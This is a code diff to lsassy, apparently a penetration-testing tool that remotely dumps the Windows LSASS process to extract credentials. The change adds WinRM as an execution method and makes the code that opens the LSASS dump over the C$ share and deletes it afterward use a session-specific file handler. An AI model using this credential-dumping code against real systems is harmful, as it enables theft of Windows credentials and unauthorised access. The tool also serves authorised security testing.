@@ -5,10 +5,9 @@ import time
 from queue import Queue
 
 from lsassy.dumper import Dumper
-from lsassy.impacketfile import ImpacketFile
 from lsassy.logger import lsassy_logger
 from lsassy.parser import Parser
-from lsassy.session import Session
+from lsassy.session import Session, WinrmSession
 from lsassy.utils import get_targets
 from lsassy.writer import Writer
 
@@ -114,6 +113,8 @@ class Lsassy:
 
         # Exec methods parsing
         exec_methods = self.args.exec.split(",") if self.args.exec else None
+        if exec_methods and "winrm" in exec_methods and len(exec_methods)>1:
+            lsassy_logger.error(f"Incompatible methods winrm and {exec_methods} - can only use either winrm or others")
 
         # Dump modules options parsing
         options = (
@@ -154,7 +155,11 @@ class Lsassy:
             return False
 
         try:
-            session = Session()
+            if exec_methods and "winrm" in exec_methods:
+                session = WinrmSession()
+                self.args.port = 5985
+            else:
+                session = Session()
             session.get_session(
                 address=self.target,
                 target_ip=self.target,
@@ -194,7 +199,7 @@ class Lsassy:
                     lsassy_logger.error("Unable to dump lsass.")
                     return False
             else:
-                file = ImpacketFile(session).open(
+                file = session.correct_file_handler()(session).open(
                     share="C$",
                     path=dump_path,
                     file=self.args.dump_name,
@@ -210,7 +215,7 @@ class Lsassy:
 
             if not parse_only and not keep_dump:
                 try:
-                    if ImpacketFile.delete(
+                    if session.correct_file_handler().delete(
                         session,
                         file_path=file.get_file_path(),
                         timeout=self.args.timeout,
@@ -221,7 +226,7 @@ class Lsassy:
                         lsassy_logger.debug(
                             "Couldn't delete lsass dump using file. Trying dump object..."
                         )
-                        if ImpacketFile.delete(
+                        if session.correct_file_handler().delete(
                             session,
                             file_path=dumper.dump_path + dumper.dump_name,
                             timeout=self.args.timeout,
